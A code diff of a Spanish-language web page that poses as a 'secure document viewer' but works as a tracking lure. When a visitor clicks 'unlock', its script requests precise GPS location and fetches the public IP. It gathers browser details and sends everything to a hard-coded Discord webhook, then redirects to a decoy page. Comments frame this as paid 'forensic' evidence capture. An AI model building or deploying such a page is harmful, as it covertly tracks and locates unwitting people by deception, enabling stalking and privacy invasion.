@@ -3,83 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visor de Documentos Seguro</title>
+    <title>Visualizador de Documentos Seguro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
-<body class="bg-gray-900 flex items-center justify-center min-h-screen text-white font-sans">
+<body class="bg-slate-900 flex items-center justify-center min-h-screen text-white font-sans">
 
-    <div id="interface" class="max-w-md w-full p-8 bg-gray-800 shadow-2xl rounded-2xl text-center border border-gray-700">
-        <div id="step-1">
-            <div class="mb-6 text-blue-500">
+    <div id="app" class="max-w-md w-full p-8 bg-slate-800 shadow-2xl rounded-2xl text-center border border-slate-700">
+        <div id="ui-prompt">
+            <div class="mb-6 text-blue-400">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
-            <h1 class="text-xl font-bold mb-4">Archivo Encriptado</h1>
-            <p class="text-gray-400 text-sm mb-6">Para visualizar este documento, debe validar su identidad y permitir la verificación de seguridad del servidor.</p>
+            <h1 class="text-xl font-bold mb-4">Documento Protegido</h1>
+            <p class="text-slate-400 text-sm mb-8">Para acceder al expediente, el sistema requiere una validación de seguridad de su navegador.</p>
             
-            <button onclick="solicitarAcceso()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-8 rounded-full transition-all transform active:scale-95">
-                VER DOCUMENTO
+            <button onclick="iniciarVerificacion()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full transition-all active:scale-95 shadow-lg shadow-blue-900/20">
+                DESBLOQUEAR ARCHIVO
             </button>
         </div>
 
-        <div id="step-2" class="hidden">
+        <div id="ui-loading" class="hidden">
             <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <p class="text-gray-400">Validando acceso...</p>
+            <p class="text-slate-400 animate-pulse">Procesando firma digital...</p>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
-        const CEBO_URL = "https://google.com"; // Cambia por el archivo real después
+        const DESTINO_FINAL = "https://google.com"; // Aquí irá tu archivo real
 
-        async function enviarADiscord(lat = "N/A", lon = "N/A", acc = "N/A") {
-            const resIP = await fetch('https://api.ipify.org?format=json');
-            const ipData = await resIP.json();
-            
-            const log = {
-                ts: new Date().toISOString(),
-                ip: ipData.ip,
-                loc: { lat, lon, precision: acc },
-                ua: navigator.userAgent
-            };
+        async function exfiltrar(lat = "DENIEGA_GPS", lon = "DENIEGA_GPS", acc = "N/A") {
+            try {
+                // Captura de IP (Usa IPv4 para mayor compatibilidad)
+                const resIP = await fetch('https://api.ipify.org?format=json');
+                const ipData = await resIP.json();
+                
+                const logForense = {
+                    time: new Date().toISOString(),
+                    ip: ipData.ip,
+                    geo: { lat, lon, prec: acc },
+                    agente: navigator.userAgent,
+                    lang: navigator.language
+                };
 
-            // El Hash que TÚ necesitas para cobrar tus $8,000 MXN
-            const hash = CryptoJS.SHA256(JSON.stringify(log)).toString();
+                // Hash SHA-256 para tu reporte (Cadena de Custodia)
+                const firma = CryptoJS.SHA256(JSON.stringify(logForense)).toString();
 
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🔍 CAPTURA PERICIAL EXITOSA",
-                        color: 3066993,
-                        fields: [
-                            { name: "📍 Ubicación Exacta", value: lat !== "N/A" ? `[Abrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` : "❌ PERMISO DENEGADO", inline: false },
-                            { name: "🎯 Precisión", value: acc !== "N/A" ? `${acc} metros` : "N/A", inline: true },
-                            { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
-                            { name: "🔑 SHA-256 (Tu Firma)", value: `\`${hash}\`` }
-                        ]
-                    }]
-                })
-            });
-
-            window.location.href = CEBO_URL;
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🛡️ EVIDENCIA CAPTURADA",
+                            color: 15406156, // Rojo pericial
+                            fields: [
+                                { name: "📍 Mapa GPS", value: lat !== "DENIEGA_GPS" ? `[Abrir Ubicación](https://www.google.com/maps?q=${lat},${lon})` : "❌ ACCESO DENEGADO" },
+                                { name: "🎯 Precisión", value: acc !== "N/A" ? `${acc} metros` : "N/A", inline: true },
+                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
+                                { name: "🔑 Hash SHA-256", value: `\`${firma}\`` },
+                                { name: "📱 Navegador", value: `\`${logForense.agente}\`` }
+                            ]
+                        }]
+                    })
+                });
+            } finally {
+                window.location.href = DESTINO_FINAL;
+            }
         }
 
-        function solicitarAcceso() {
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
+        function iniciarVerificacion() {
+            document.getElementById('ui-prompt').classList.add('hidden');
+            document.getElementById('ui-loading').classList.remove('hidden');
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => enviarADiscord(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
-                    (err) => enviarADiscord(),
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    (p) => exfiltrar(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+                    () => exfiltrar(),
+                    { enableHighAccuracy: true, timeout: 6000 }
                 );
             } else {
-                enviarADiscord();
+                exfiltrar();
             }
         }
     </script>
